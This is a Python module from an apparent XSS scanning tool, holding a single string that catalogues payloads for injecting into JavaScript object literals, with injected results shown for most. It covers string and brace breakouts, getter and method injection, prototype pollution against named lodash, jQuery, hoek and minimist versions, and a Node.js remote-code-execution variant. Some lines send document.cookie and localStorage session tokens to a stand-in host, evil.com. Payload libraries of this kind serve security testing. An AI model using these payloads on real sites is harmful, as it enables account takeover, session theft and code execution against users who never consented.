#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

JavaScript Object Context - Attack Vectors
"""

ATTACK_VECTOR = """
UNQUOTED VALUE INJECTION:

1. BASIC PROPERTY INJECTION:
   <script>var config = {admin: USER_INPUT};</script>
   
   Payload (unquoted):
   true, exploit: alert(1), real: false
   
   Result:
   <script>var config = {admin: true, exploit: alert(1), real: false};</script>

2. METHOD INJECTION:
   Payload:
   false, hack: function(){alert(1)}, real: true
   
   Result:
   <script>var config = {admin: false, hack: function(){alert(1)}, real: true};</script>

3. COMPUTED PROPERTY INJECTION:
   Payload:
   null, [alert(1)]: true, x: null
   
   Result:
   <script>var config = {value: null, [alert(1)]: true, x: null};</script>

QUOTED STRING BREAKOUT:

4. BREAKING OUT OF STRING VALUE:
   <script>var user = {name: 'USER_INPUT'};</script>
   
   Payloads:
   ', admin: true, real: '
   ', hack: alert(1), x: '
   ', get value(){return alert(1)}, x: '
   
   Result:
   <script>var user = {name: '', admin: true, real: ''};</script>

5. DOUBLE QUOTE BREAKOUT:
   <script>var config = {key: "USER_INPUT"};</script>
   
   Payload:
   ", exploit: alert(1), real: "
   
   Result:
   <script>var config = {key: "", exploit: alert(1), real: ""};</script>

6. TEMPLATE LITERAL IN OBJECT:
   <script>var obj = {msg: `USER_INPUT`};</script>
   
   Payload:
   ${alert(1)}
   
   Result:
   <script>var obj = {msg: `${alert(1)}`};</script>

PROTOTYPE POLLUTION ATTACKS:

7. __PROTO__ INJECTION:
   <script>var config = USER_INPUT;</script>
   
   Payload:
   {"__proto__": {"polluted": true}}
   {"__proto__": {"isAdmin": true}}
   {"__proto__": {"toString": "alert(1)"}}
   
   After merge/assign:
   Object.prototype.polluted === true // All objects affected!

8. CONSTRUCTOR POLLUTION:
   Payload:
   {"constructor": {"prototype": {"isAdmin": true}}}
   
   Affects constructor's prototype

9. PROTOTYPE POLLUTION TO XSS:
   Step 1: Pollute
   {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
   
   Step 2: Trigger when code does:
   someElement[unknownProp] // Falls back to prototype
   
   Or:
   {"__proto__": {"src": "javascript:alert(1)"}}
   
   Then code that does:
   img.src = obj.src || defaultSrc;

10. PROTOTYPE POLLUTION VIA NESTED PATH:
    Payload:
    {"__proto__.polluted": "yes"}
    {"constructor.prototype.isAdmin": true}
    
    Some parsers treat dot as nested property

11. ARRAY INDEX POLLUTION:
    Payload:
    {"__proto__": [1, 2, 3]}
    
    Or:
    {"__proto__[0]": "polluted"}

GETTER/SETTER INJECTION:

12. GETTER WITH SIDE EFFECTS:
    Payload:
    {get value(){alert(1); return 1}}
    {get x(){fetch('//evil.com?c='+document.cookie); return null}}
    
    Executed when property is accessed:
    console.log(obj.value); // Triggers alert

13. SETTER INJECTION:
    Payload:
    {set value(v){alert(v)}}
    
    Executed when property is set:
    obj.value = 'test'; // Triggers alert('test')

14. COMBINED GETTER/SETTER:
    Payload:
    {
      get admin(){return true},
      set admin(v){alert('Setting admin to: '+v)}
    }

COMPUTED PROPERTY NAMES:

15. EXPRESSION IN PROPERTY NAME:
    <script>var obj = {[USER_INPUT]: 'value'};</script>
    
    Payload:
    alert(1)
    
    Result:
    <script>var obj = {[alert(1)]: 'value'};</script>
    (alert executes during property name evaluation)

16. COMPUTED WITH TEMPLATE:
    Payload:
    `${alert(1)}`
    
    Result:
    <script>var obj = {[`${alert(1)}`]: 'value'};</script>

17. BREAKING OUT OF COMPUTED:
    <script>var obj = {[`key_${USER_INPUT}`]: val};</script>
    
    Payload:
    ${alert(1)}`]: null, exploit: alert(2), real: {[`x
    
    Result:
    <script>var obj = {[`key_${alert(1)}`]: null, exploit: alert(2), real: {[`x`]: val};</script>

METHOD AND FUNCTION INJECTION:

18. METHOD SHORTHAND:
    Payload:
    null, exploit(){alert(1)}, real:null
    
    Result:
    <script>var obj = {value: null, exploit(){alert(1)}, real:null};</script>

19. ARROW FUNCTION:
    Payload:
    null, hack: ()=>alert(1), real: null
    
    Result:
    <script>var obj = {value: null, hack: ()=>alert(1), real: null};</script>

20. ASYNC METHOD:
    Payload:
    null, async exploit(){await fetch('//evil.com')}, real:null

21. GENERATOR METHOD:
    Payload:
    null, *gen(){yield alert(1)}, real:null

SYMBOL PROPERTY INJECTION:

22. SYMBOL AS KEY:
    Payload:
    [Symbol.toPrimitive]: function(){return alert(1)}
    [Symbol.iterator]: function*(){yield alert(1)}
    [Symbol.toStringTag]: alert(1)

OBJECT SPREAD EXPLOITATION:

23. SPREAD OPERATOR POLLUTION:
    <script>var merged = {...defaults, ...USER_INPUT};</script>
    
    If USER_INPUT is:
    {__proto__: {polluted: true}}
    
    Can pollute Object.prototype

24. NESTED SPREAD:
    <script>var obj = {a: {...USER_INPUT}};</script>
    
    Payload:
    {__proto__: {polluted: true}}

BREAKING OUT OF OBJECT LITERAL:

25. CLOSING BRACE:
    <script>var obj = {key: USER_INPUT};</script>
    
    Payload:
    null}; alert(1); var obj2 = {key: null
    
    Result:
    <script>var obj = {key: null}; alert(1); var obj2 = {key: null};</script>

26. CLOSING NESTED OBJECT:
    <script>var obj = {nested: {value: USER_INPUT}};</script>
    
    Payload:
    null}}, exploit: alert(1), real: {value: null
    
    Result:
    <script>var obj = {nested: {value: null}}, exploit: alert(1), real: {value: null}};</script>

27. ARRAY IN OBJECT BREAKOUT:
    <script>var obj = {items: [USER_INPUT]};</script>
    
    Payload:
    null]}, exploit: alert(1), real: {items: [null
    
    Result:
    <script>var obj = {items: [null]}, exploit: alert(1), real: {items: [null]};</script>

JSON.PARSE EXPLOITATION:

28. JSON STRING INJECTION:
    <script>var obj = JSON.parse('USER_INPUT');</script>
    
    Payload:
    {"__proto__": {"polluted": true}}
    
    If JSON.parse is vulnerable (older libraries)

29. JSON WITH REVIVER:
    <script>
    var obj = JSON.parse(USER_INPUT, function(k, v) {
        if (k === '__proto__') return; // Attempted protection
        return v;
    });
    </script>
    
    Bypass:
    {"constructor": {"prototype": {"polluted": true}}}

30. JSON UNICODE ESCAPE:
    Payload:
    {"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": true}}
    (\\u005f = underscore)

FRAMEWORK-SPECIFIC ATTACKS:

31. LODASH MERGE POLLUTION:
    _.merge(target, USER_INPUT)
    
    Payload:
    {"__proto__": {"polluted": true}}
    
    Affects: lodash < 4.17.11

32. JQUERY EXTEND POLLUTION:
    $.extend(true, target, USER_INPUT)
    
    Payload:
    {"__proto__": {"polluted": true}}
    
    Affects: jQuery < 3.4.0

33. HOEK MERGE (HAPI.JS):
    Hoek.merge(target, USER_INPUT)
    
    Payload:
    {"__proto__": {"polluted": true}}
    
    Affects: hoek < 5.0.3

34. MINIMIST PARSER:
    minimist(USER_INPUT)
    
    Payload:
    ['--__proto__.polluted=true']
    
    Affects: minimist < 1.2.6

REAL-WORLD ATTACK SCENARIOS:

AUTHENTICATION BYPASS VIA PROTOTYPE POLLUTION:
<script>
var user = {"__proto__": {"isAdmin": true}};
Object.assign(currentUser, user);
// Now: if (currentUser.isAdmin) { /* access granted */ }
</script>

SESSION HIJACKING:
<script>
var config = {
    apiKey: null, 
    steal: function() {
        fetch('//evil.com?c=' + document.cookie + '&s=' + localStorage.getItem('session'));
    }, 
    real: null
};
config.steal();
</script>

DOM-BASED XSS VIA POLLUTION:
<script>
// Pollute prototype
merge(defaults, {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}});

// Later in code:
element[someProperty] = "value";
// If someProperty is undefined, falls back to prototype.innerHTML
</script>

RCE VIA PROTOTYPE POLLUTION (Node.js):
// In server-side Node.js
const obj = {};
merge(obj, JSON.parse(userInput));
// Payload: {"__proto__": {"shell": "/bin/bash", "argv0": "exploit"}}
// Later: child_process.spawn() uses polluted properties

DENIAL OF SERVICE:
<script>
var config = {
    get value() {
        while(1) {} // Infinite loop
        return null;
    }
};
console.log(config.value); // DoS
</script>
"""

